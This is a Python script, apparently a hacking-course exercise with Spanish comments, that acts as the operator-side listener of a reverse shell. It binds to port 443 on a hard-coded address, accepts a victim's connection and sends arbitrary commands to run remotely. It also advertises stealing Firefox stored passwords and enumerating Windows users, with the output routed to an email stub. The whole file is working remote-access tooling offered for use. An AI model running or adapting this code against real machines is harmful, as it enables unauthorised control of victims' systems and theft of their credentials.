#!/usr/bin/env python3

import signal
import socket
import subprocess
import sys

from termcolor import colored


def def_handler(sig, frame):

    print("\n[!] Saliendo...\n\n ")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


class Listener:

    def __init__(self, ip, port):

        self.options = {
            "get users": "List system valid users",
            "get firefox": "Get firefox Stored Passwords",
            "help": "Show this help panel",
        }

        # NOTE: Start server with my ip and 443 port
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # HACK: Para evitar que el socket quede ocupado...
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        my_ip = subprocess.check_output("hostname -I", shell=True)
        # NOTE: En escucha por mi ip y puerto 443
        server_socket.bind(("192.168.100.41", 443))

        server_socket.listen()

        print(
            colored(f"\n[+] Listening for incomming conections on port 443..\n", "blue")
        )
        self.client_socket, client_addres = server_socket.accept()

        print(colored(f"\n[+] Client connected by {client_addres}", "green"))

    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def send_mail(self, subject, body, sender, recipients, password):
        print(f"\n[+] Sending mail...\n")
        password = password
        print(
            f"[-] Subject: {subject}\n[-] Sender: {sender}\n[-] Recipient: {recipients}\n[-] Body: {body}\n"
        )

    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(2048).decode()
        self.send_mail(
            "get_users_mail",
            output_command,
            "kraken@test.com",
            ["otro_kraken@test.com"],
            "password",
        )

    def show_help(self):
        for key, value in self.options.items():
            print(colored(f"\n{key} -> {value}\n", "blue"))

    def run(self):
        while True:
            command = input(">> ")
            if command == "get user":
                self.get_users()
            elif command == "Exit" or command == "exit":
                self.execute_remotely("Exit")
                sys.exit(1)
            elif command == "help":
                self.show_help()
            else:
                command_output = self.execute_remotely(command)
                print(colored(command_output, "green"))


if __name__ == "__main__":
    my_listener = Listener("192.168.100.41", 443)
    my_listener.run()
